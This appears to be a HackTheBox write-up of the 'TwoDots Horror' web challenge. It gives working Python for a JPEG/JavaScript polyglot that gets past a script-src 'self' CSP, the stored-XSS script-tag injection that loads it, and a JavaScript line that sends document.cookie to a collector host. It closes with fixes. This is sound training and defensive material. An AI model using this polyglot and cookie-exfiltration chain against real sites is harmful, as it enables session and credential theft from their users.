---
title: "TwoDots Horror"
date: 2027-12-22 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csp-bypass, polyglot, file-upload, content-sniffing, nunjucks, cwe-79, cwe-434]
description: "A medium Web challenge where a strict script-src 'self' CSP looks airtight — until you upload a file that is both a valid JPEG and valid JavaScript, get it served back same-origin, and load it with a script tag. Stored XSS in a bot-only review page, defeated with a JPEG/JS polyglot avatar and a cookie exfil that leaves via top-level navigation."
---

## Overview

TwoDots Horror is a medium HackTheBox web challenge — a Node/Express + nunjucks
blog of two-sentence horror stories. Posts you submit are reviewed by an admin
bot that carries the flag as a cookie. There is a stored [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html)
sink on the bot-only review page, but a strict `Content-Security-Policy` blocks
inline scripts and external exfil. The path is a JPEG/JavaScript **polyglot**:
upload it as your avatar, load it same-origin with a `<script>` tag to bypass the
CSP, and steal the flag cookie.

## The technique

The review page renders each post with `{{ post.content | safe }}` — nunjucks
autoescaping is off, so HTML you submit is injected raw. Only the admin bot
reaches `/review` (`req.ip == '127.0.0.1'`), and the bot holds the flag in a
non-HttpOnly cookie. So we have a stored XSS that fires in a context that can
read the flag.

The catch is the CSP on every response:

```
Content-Security-Policy: default-src 'self'; object-src 'none'; style-src ...; font-src ...
```

There is no `script-src` override, so it inherits `'self'`: no inline `<script>`,
no inline `onerror=`, and no `fetch`/`<img>` to any external host. The only way to
run JavaScript is a **same-origin script file** — and the app hands us one. The
avatar upload (`/api/upload`) validates weakly:

- `is-jpg` v2 only checks the first bytes are `FF D8 FF`.
- `image-size` only requires the image be at least 120×120.

A file that is *both* a valid JPEG and valid JavaScript passes both checks. It is
served back at `/api/avatar/<user>` via `res.sendFile` as
`application/octet-stream` **with no `X-Content-Type-Options: nosniff`** — so a
classic `<script src>` will execute it. This is the [dangerous-file-upload](https://cwe.mitre.org/data/definitions/434.html)
that turns the XSS sink into full JavaScript execution under the CSP.

## Solution

**The polyglot** (Gareth Heyes' technique, PortSwigger "Bypassing CSP using
polyglot JPEGs"). The file begins `FF D8 FF E0`, which decoded as latin-1 is the
JavaScript identifier `ÿØÿà`; the APP0 segment-length bytes `09 3A` are TAB and
`:`, turning `ÿØÿà` into a JS label so `JFIF=1;` is a clean assignment; then the
payload runs and `/*` opens a comment that swallows all the binary image data,
closed by `*/` right before the `FF D9` end marker.

Create `craft.py` (the core of the solve):

```python
import struct

def craft_jpg_polyglot(payload, height=200, width=200):
    data  = b'\xFF\xD8\xFF\xE0'          # is-jpg magic + APP0 marker
    data += b'\x09\x3A'                  # APP0 len 0x093A == TAB ':' -> `ÿØÿà` becomes a JS label
    data += b'JFIF'
    pay = '=1;' + payload + ';' + '/*'   # JFIF=1; <payload>; then open a comment
    data += pay.encode('latin-1')
    data += b'\x00' * (2356 - len(pay))  # pad so the APP0 segment == its declared 2362 length
    data += b'\xFF\xC0\x00\x11\x08' + struct.pack('!H', height) + struct.pack('!H', width)  # SOF0 dims
    data += b'\x2A\x2F'                  # */  close the JS comment
    data += b'\xFF\xD9'                  # EOI
    return data
```

The JavaScript payload exfiltrates the cookie by **top-level navigation** — which
`default-src`/`script-src` do not restrict (that would need `form-action` or
`navigate-to`, both unset), so it leaves even though `fetch`/`<img>` to external
hosts are blocked:

```js
location = 'https://<collector>/?c=' + encodeURIComponent(document.cookie)
```

The full run: register, log in, upload the polyglot as `avatarFile`, then submit a
post that injects the script tag. Two details matter — the tag needs
`charset="ISO-8859-1"` (the page is UTF-8, and without forcing latin-1 the `FF D8`
bytes are invalid UTF-8 and the script is a syntax error), and `/api/submit`
requires the content contain **exactly two `.` characters** (the "TwoDots" gate),
so append `..`:

```python
content = '<script charset="ISO-8859-1" src="/api/avatar/pwn"></script>..'
assert content.count('.') == 2
```

Submitting triggers the bot, which loads `/review`, executes the polyglot script,
and navigates to the collector carrying the flag cookie:

```
GET /?c=flag%3DHTB%7B...%7D
```

Flag: `HTB{...}` (redacted). A `webhook.site` token makes a clean collector and
sidesteps a NAT'd attacker box — a cloud endpoint receives the beacon and you poll
its API for the request.

## Why it worked

Two misconfigurations compound. First, the upload is validated by magic bytes
only, so a polyglot sails through. Second — and this is the load-bearing bug — the
uploaded file is served **same-origin** as `application/octet-stream` **without
`X-Content-Type-Options: nosniff`**, so the browser will execute it as a script.
`script-src 'self'` is only as strong as the set of things the origin will serve
as JavaScript, and an attacker-controlled upload endpoint quietly expands that
set. The non-HttpOnly flag cookie and the navigation-shaped exfil channel finish
the job.

## Fix / defense

- Send `X-Content-Type-Options: nosniff` on every response — an octet-stream or
  MIME-mismatched file then never runs as a script, which alone kills this chain.
- Re-encode uploaded images server-side (decode and re-emit, e.g. with `sharp`)
  so attacker bytes are never stored or served verbatim; validate by full decode,
  not by magic bytes.
- Serve user uploads from a separate sandbox origin, never same-origin as the app.
- Add `form-action`/`navigate-to` (or a restrictive `default-src` that browsers
  apply to navigation) to close the `location=` exfil channel.
- Mark the session/flag cookie `HttpOnly`, and never disable template
  autoescaping with `| safe` / `|raw` on user-controlled input.
